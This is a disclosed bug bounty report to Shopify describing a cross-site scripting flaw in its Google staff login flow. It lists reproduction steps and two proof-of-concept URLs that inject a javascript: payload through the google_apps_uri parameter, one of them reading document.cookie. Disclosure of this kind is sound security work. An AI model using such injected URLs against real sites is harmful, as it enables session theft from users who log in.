# XSS while logging using Google

## Report Details
- **Report ID**: 691611
- **URL**: https://hackerone.com/reports/691611
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-09-10T10:02:40.557Z
- **Disclosed**: 2019-09-11T17:22:32.229Z

## Reporter
- **Username**: ashketchum
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hello Security Team,
I have found xss when we enable login services as, 
Allow staff to use external services to log in to Shopify and we enable Google Apps for login
we get the " Log in with Google " option enable 

{F579219}

### Steps to Reproduce:

Step1: Go to https://YOURSHOP.myshopify.com/admin/settings/account
Step2: Login Services: Staff can use Google Apps to log in -->> Enable Google Apps for login
Step3: Now staff can log in using Google
Step4:  Log out from your account
Step5: Now go to following Url and try to log in using Google 

#### NOTE: I have made changes in the URL at google_apps_uri

### POC URL 1: 
https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.domain)&return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&ui_locales=en&upgradeable=true&ux=shop

### POC URL 2:
https://app.shopify.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.cookie)&return_to=https%3A%2F%2Fapp.shopify.com%2Fservices%2Flogin%2Fidentity_callback%3Fshop_name%3D123ashketchum%26state%3D6a_2K0iBEBMG3sv07qFMrtzfrBFY4gZ9JsN0EJAW2Xck07xlkghl0tmZwGIvYEZ1KZw2mG4d4Omhl_h5oB_7t4dcXoS37UUOMG6f9sOr7BCKyR23PWbLpVlh4A0lMXmNuxOEUeEA55eapNpVZqT6AyfnJkQhn4K89-I5O6TVqcamtHaXWRH7b1EI6U8LvQFddrBPYniYGpggAwsFLvb5UeTvRw-fbvRditQ20YWYTK8%253D&ui_locales=en&upgradeable=true&ux=shop

### XSS will be triggered!!

{F579220}

### I have attached POC Video, Please take a look!!

Regards,
@ashketchum

## Impact

The attacker can steal data from whoever who try to login using Google!!

## Attachments
- google_login.png
- xss.png
- POC.mkv
